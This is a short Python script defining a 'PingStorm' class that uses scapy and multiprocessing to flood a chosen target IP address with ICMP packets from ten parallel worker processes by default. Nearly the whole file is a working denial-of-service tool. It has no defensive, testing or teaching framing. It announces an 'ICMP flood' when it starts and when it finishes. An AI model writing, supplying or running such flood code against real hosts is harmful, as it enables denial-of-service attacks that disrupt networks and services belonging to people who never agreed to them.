import multiprocessing
from scapy.all import send, IP, ICMP

class PingStorm:
    def __init__(self, target_ip):
        self.target_ip = target_ip

    def _send_icmp_packet(self):
        packet = IP(dst=self.target_ip) / ICMP()
        send(packet, verbose=False)

    def _worker(self, packets):
        for _ in range(packets):
            self._send_icmp_packet()

    def attack(self, workers=10, packets_per_worker=100):
        print(f"Starting ICMP flood on {self.target_ip} with {workers} workers.")
        processes = []
        for _ in range(workers):
            process = multiprocessing.Process(target=self._worker, args=(packets_per_worker,))
            processes.append(process)
            process.start()

        for process in processes:
            process.join()
        print("ICMP flood completed.")
